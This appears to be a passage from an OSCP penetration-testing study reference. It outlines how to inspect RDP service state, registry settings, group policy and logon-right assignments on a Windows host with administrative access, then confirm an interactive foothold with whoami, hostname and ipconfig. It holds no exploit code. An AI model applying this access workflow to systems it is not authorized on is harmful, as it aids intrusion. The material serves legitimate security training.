**Interpret:** inspect TermService, fDenyTSConnections, configured PortNumber, qwinsta listener state and the actual source-to-port path.

**Still check:** inspect NLA/security-layer policy, applied GPO, local Remote Desktop Users membership, and the effective SeRemoteInteractiveLogonRight / SeDenyRemoteInteractiveLogonRight assignments. Deny overrides allow.

**Verify:** a usable desktop followed by whoami, hostname and ipconfig establishes the new host/identity/source position. Authentication-only success is not an interactive session.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/reference/02-service-enumeration/09-windows-remote-access/#rdp-host-side-inspection-local-administrative-context)

### Full procedure and variants

- **Enter:** you have authorized local administrative or equivalent management access to a Windows destination, and RDP access is relevant or failing.
- **Discover:** inspect `TermService`, `fDenyTSConnections`, configured `PortNumber`, `qwinsta` listener state and the actual source-to-port path.
- **Validate:** inspect NLA/security-layer policy, applied GPO, local Remote Desktop Users membership, and the effective `SeRemoteInteractiveLogonRight` / `SeDenyRemoteInteractiveLogonRight` assignments. Deny overrides allow.
- **Execute:** [RDP host-side inspection](https://armaanleg3nd.github.io/oscp/reference/02-service-enumeration/09-windows-remote-access/#rdp-host-side-inspection-local-administrative-context); then use the [RDP access procedure](https://armaanleg3nd.github.io/oscp/reference/03-initial-access/01-rdp-access/) only when its conditions are satisfied.
- **Verify:** a usable desktop followed by `whoami`, `hostname` and `ipconfig` establishes the new host/identity/source position. Authentication-only success is not an interactive session.
- **Outcomes:** listener/right/client conditions satisfied → D29 then D18; decisive deny/no listener → ruled out here; policy, SID expansion or filtering unresolved → inconclusive.

### Follow the evidence

